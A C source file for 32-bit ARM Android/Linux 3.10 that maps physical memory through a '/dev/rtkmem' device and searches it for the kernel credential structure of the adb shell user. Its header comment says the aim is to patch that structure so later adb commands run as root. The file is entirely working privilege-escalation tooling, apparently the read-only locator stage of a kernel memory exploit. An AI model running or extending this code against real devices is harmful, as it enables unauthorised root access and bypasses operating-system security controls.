/* rtfind2.c - READ-ONLY locator of struct cred in live physical RAM.
 *
 * Instead of relying on comm (which can match a userspace copy / freed slab),
 * look for the distinctive shape of struct cred on Linux 3.10 (ARM 32-bit):
 *
 *   offset 0  atomic_t usage          (small positive int)
 *   4..35     uid,gid,suid,sgid,euid,egid,fsuid,fsgid   (all == shell uid 2000)
 *   36        unsigned securebits     (0)
 *   40..      kernel_cap_t caps       (u32 pairs)
 *
 * All adb-shell children share one cred (copy_cred just bumps usage), so
 * patching a single matching cred is enough for later adb commands to be root.
 *
 * Prints candidates. WRITES ABSOLUTELY NOTHING.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define PAGE_OFFSET 0xC0000000UL
#define SCAN_END    0x20000000UL
#define CHUNK       (1u << 20)

static sigjmp_buf g_jmp;
static void fault_handler(int sig) { (void)sig; siglongjmp(g_jmp, 1); }

int main(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    uint32_t uid = (uint32_t)getuid();
    printf("[*] rtfind2 READ-ONLY: uid=%u pid=%d\n", uid, (int)getpid());
    printf("[*] searching struct cred (8 consecutive uid fields) in 0..0x%x\n",
           (unsigned)SCAN_END);
    fflush(stdout);

    int fd = open("/dev/rtkmem", O_RDONLY);
    if (fd < 0) { printf("open: %s\n", strerror(errno)); return 2; }

    int hits = 0;
    uint64_t first_phys = 0;
    for (uint64_t p = 0; p < SCAN_END; p += CHUNK) {
        void *m = mmap(NULL, CHUNK, PROT_READ, MAP_SHARED, fd, (off_t)p);
        if (m == MAP_FAILED) continue;
        unsigned char *v = (unsigned char *)m;
        if (sigsetjmp(g_jmp, 1)) { munmap(m, CHUNK); continue; }
        for (size_t i = 0; i + 80 <= CHUNK; i += 4) {
            uint32_t w[10];
            memcpy(w, v + i, 40);
            if (w[0] < 1 || w[0] > 1000000) continue;
            int n = 0;
            for (int q = 1; q <= 8; q++) if (w[q] == uid) n++;
            if (n != 8) continue;
            if (w[9] != 0) continue;   /* securebits */
            uint64_t phys = p + i;
            hits++;
            if (hits == 1) first_phys = phys;
            printf("\n[+] CRED CANDIDATE #%d phys=0x%llx virt=0x%08x\n",
                   hits, (unsigned long long)phys,
                   (uint32_t)(phys + PAGE_OFFSET));
            printf("    usage=%u  uid..fsgid: %u %u %u %u %u %u %u %u  securebits=%u\n",
                   w[0], w[1], w[2], w[3], w[4], w[5], w[6], w[7], w[8], w[9]);
            uint32_t caps[8];
            memcpy(caps, v + i + 40, 32);
            printf("    cap words: %08x %08x %08x %08x %08x %08x %08x %08x\n",
                   caps[0], caps[1], caps[2], caps[3],
                   caps[4], caps[5], caps[6], caps[7]);
            fflush(stdout);
            if (hits >= 20) break;
        }
        munmap(m, CHUNK);
        if (hits >= 20) break;
        if (((p >> 20) & 0xff) == 0) {
            printf("    ... scanned %llu MiB (hits=%d)\n",
                   (unsigned long long)(p >> 20), hits);
            fflush(stdout);
        }
    }
    printf("\n[*] total cred candidates: %d\n", hits);
    if (hits) printf("[*] FIRST_CRED_PHYS=0x%llx\n", (unsigned long long)first_phys);
    printf("[*] nothing written\n");
    close(fd);
    return 0;
}
